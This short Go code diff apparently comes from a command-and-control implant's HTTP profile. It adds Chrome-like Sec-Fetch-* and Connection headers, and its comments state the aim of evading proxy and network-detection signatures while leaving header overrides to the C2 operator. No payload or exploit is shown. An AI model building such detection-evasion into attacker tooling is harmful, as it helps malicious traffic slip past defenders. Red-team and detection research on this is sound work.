@@ -874,7 +874,7 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte, cfg *sensiti
 			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 		}
 		req.Header.Set("Accept", chromeAcceptHeader)
-		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+		req.Header.Set("Accept-Language", chromeAcceptLanguage)
 		req.Header.Set("Accept-Encoding", chromeAcceptEncoding)
 
 		if secChUa := generateSecChUa(userAgent); secChUa != "" {
@@ -884,6 +884,16 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte, cfg *sensiti
 		}
 
 		req.Header.Set("Upgrade-Insecure-Requests", "1")
+
+		// Sec-Fetch-* headers: Chrome 80+ attaches these to every navigation request.
+		// Their absence is a trivial non-browser signature for any proxy or NDR.
+		// Applied before customHeaders so the operator can override them from the C2 profile.
+		for k, v := range generateSecFetchHeaders(method) {
+			req.Header.Set(k, v)
+		}
+
+		// Connection: keep-alive — Chrome sends this on HTTP/1.1 connections.
+		req.Header.Set("Connection", chromeConnectionHeader)
 
 		for k, v := range customHeaders {
 			req.Header.Set(k, v)
